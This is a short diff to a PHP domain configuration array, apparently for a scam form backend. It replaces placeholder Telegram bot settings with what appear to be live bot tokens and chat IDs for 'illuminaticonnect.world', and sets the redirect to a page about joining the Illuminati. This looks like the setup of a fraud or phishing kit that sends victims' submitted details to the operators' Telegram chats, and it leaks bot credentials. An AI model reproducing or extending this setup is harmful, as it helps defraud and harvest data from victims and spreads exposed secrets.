@@ -39,11 +39,12 @@ $site_map = [
 
     ],
     
-    'submitt.onrender.com' => [
-        'bots' => [
-            ['token' => 'YOUR_BOT_TOKEN_HERE', 'chat_id' => 'YOUR_CHAT_ID_HERE'],
+    'illuminaticonnect.world' => [
+        "bots" => [
+            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+            ['token' => '8578491453:AAFjqP9TdTwv4IpsCJdghljt28y0yHqnYD8', 'chat_id' => '1972703470'],
         ],
-        'redirect' => 'https://illuminatiofficial.org/thank-you/'
+        "redirect" => "https://illuminaticonnect.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
     ],
     // Add more domains as needed
 ];
